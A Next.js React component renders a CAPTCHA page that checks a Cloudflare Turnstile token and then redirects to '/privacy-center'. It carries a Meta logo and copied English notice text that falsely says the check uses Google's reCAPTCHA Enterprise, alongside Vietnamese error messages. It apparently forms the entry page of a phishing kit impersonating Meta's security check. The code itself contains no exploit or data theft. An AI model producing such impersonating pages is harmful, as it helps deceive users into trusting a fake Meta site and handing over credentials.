'use client'

import React from 'react'
import { useRouter } from 'next/navigation'

declare global {
    interface Window {
        turnstile?: {
            render: (container: string | HTMLElement, options: Record<string, unknown>) => string
            reset: (widgetId?: string) => void
        }
    }
}

const ReCaptcha = () => {
    const [captchaState, setCaptchaState] = React.useState<'idle' | 'verifying' | 'error'>('idle');
    const [errorMessage, setErrorMessage] = React.useState('');
    const widgetIdRef = React.useRef<string | null>(null);
    const widgetContainerRef = React.useRef<HTMLDivElement | null>(null);
    const router = useRouter()
    const siteKey = process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY;

    React.useEffect(() => {
        if (!siteKey) {
            setCaptchaState('error');
            setErrorMessage('Thiếu cấu hình CAPTCHA. Vui lòng liên hệ quản trị viên.');
            return;
        }

        const renderTurnstile = () => {
            if (!window.turnstile || !widgetContainerRef.current || widgetIdRef.current) return;

            widgetIdRef.current = window.turnstile.render(widgetContainerRef.current, {
                sitekey: siteKey,
                theme: 'light',
                callback: async (token: string) => {
                    try {
                        setCaptchaState('verifying');
                        setErrorMessage('');
                        const response = await fetch('/api/turnstile/verify', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ token }),
                        });
                        const result = await response.json();
                        if (result?.success) {
                            router.push('/privacy-center');
                            return;
                        }

                        setCaptchaState('error');
                        setErrorMessage('Xác minh thất bại. Vui lòng thử lại.');
                        window.turnstile?.reset(widgetIdRef.current || undefined);
                    } catch (error) {
                        setCaptchaState('error');
                        setErrorMessage('Không thể xác minh CAPTCHA. Vui lòng thử lại.');
                        window.turnstile?.reset(widgetIdRef.current || undefined);
                    }
                },
                'error-callback': () => {
                    setCaptchaState('error');
                    setErrorMessage('Đã xảy ra lỗi CAPTCHA. Vui lòng thử lại.');
                },
                'expired-callback': () => {
                    setCaptchaState('idle');
                    setErrorMessage('Mã xác minh đã hết hạn. Vui lòng xác minh lại.');
                },
            });
        };

        if (window.turnstile) {
            renderTurnstile();
            return;
        }

        const script = document.createElement('script');
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
        script.async = true;
        script.defer = true;
        script.onload = renderTurnstile;
        document.head.appendChild(script);

        return () => {
            script.onload = null;
        };
    }, [router, siteKey]);

    return (
        <div className="bg-[#ffffff] flex flex-col items-center justify-start h-screen w-full">
            <div className="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 max-w-[325px]">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
                </div>

                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
                    <div className="w-full rounded-md border-2 bg-[#f9f9f9] px-[10px] py-[10px]">
                        <div ref={widgetContainerRef} className="min-h-[65px]"></div>
                        {captchaState === 'verifying' && (
                            <p className="mt-[6px] text-[12px] text-[#6b7280]">Đang xác minh bảo mật...</p>
                        )}
                        {errorMessage && (
                            <p className="mt-[6px] text-[12px] text-[#c62828]">{errorMessage}</p>
                        )}
                    </div>
                </div>

                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
                    <p className="font-normal">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p className="font-normal mt-4">We’ve used Google’s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p className="font-normal mt-4">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    )
}

export default ReCaptcha